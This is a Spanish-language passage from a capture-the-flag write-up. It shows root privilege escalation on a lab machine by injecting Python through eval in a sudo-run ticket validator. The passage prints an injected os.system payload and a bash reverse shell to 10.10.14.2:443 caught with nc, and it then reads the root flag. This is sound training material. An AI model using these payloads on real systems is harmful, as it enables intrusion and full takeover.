En este caso, el código del ticket no pasa la validación, ya que el resultado de la operación `31 + 410 + 86` no cumple con los requisitos para ser considerado válido, lo que lleva a que el script devuelva el mensaje "Invalid ticket".

```bash
development@bountyhunter:/tmp$ cat gzzcoo.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/gzzcoo.md
Destination: New Haven
Invalid ticket.
```

En el archivo `gzzcoo.md` que se presenta a continuación, intentamos explotar la vulnerabilidad en la función `eval` del script `ticketValidator.py`. Al introducir una expresión maliciosa como parte del código del ticket, podemos ejecutar comandos arbitrarios en el sistema.

Aquí, hemos modificado el `Ticket Code` para incluir un comando Python que invoca la función `os.system('id')`, lo cual ejecuta el comando `id` en el sistema operativo. Esta es una forma de aprovechar la vulnerabilidad en el uso de `eval` que no sanitiza la entrada.

{% code title="gzzcoo.md" %}
```markdown
# Skytrain Inc
## Ticket to Exploitville
__Ticket Code:__
**4+__import__('os').system('id')**
##Issued: 2025/03/03
#End Ticket
```
{% endcode %}

Al ejecutar el script `ticketValidator.py` con un archivo de ticket malicioso, observamos que se ejecuta el comando `id` a través de la vulnerabilidad en la función `eval`. El resultado muestra que, aunque el script indica "Invalid ticket", el comando `id` sigue ejecutándose, revelando que el sistema está corriendo con privilegios de `root`.

```bash
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/gzzcoo.md
Destination: Exploitville
uid=0(root) gid=0(root) groups=0(root)
Invalid ticket.
```

Dado que tenemos permisos de sudoers, y en el punto anterior comprobamos que el resultado del comando `id` era `root`, si conseguimos ejecutar la reverse shell, obtendremos una shell como el usuario `root`. Esto se debe a que el script `ticketValidator.py` se ejecuta con privilegios de `root`, lo que nos permite ejecutar comandos con estos privilegios sin restricciones. Así, al inyectar el comando de la reverse shell en el ticket, la ejecución nos otorgará acceso a la máquina como `root`.

{% code title="gzzcoo.md" %}
```markdown
# Skytrain Inc
## Ticket to Exploitville
__Ticket Code:__
**4+__import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"')**
##Issued: 2025/03/03
#End Ticket
```
{% endcode %}

Nos ponemos en escucha ocn `nc` para recibir la conexión de la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ejecutaremos el script como `sudo` ya que disponemso de permisos de `sudoers` para ejecutar el script como `sudo`. Indicaremos la ruta de nuestro archivo `gzzcoo.md` el cual contiene la inyección para vulnerar la función `eval` del script tal y como comentamos anteriormente.

```bash
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/gzzcoo.md
Destination: Exploitville
```

Comprobamos que recibimos la Reverse Shell como el usuario `root` y logramos visualizar finalmente la flag **root.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.100] 32876
root@bountyhunter:/tmp# whoami
root
root@bountyhunter:/tmp# cat /root/root.txt
ceb5***************************
```
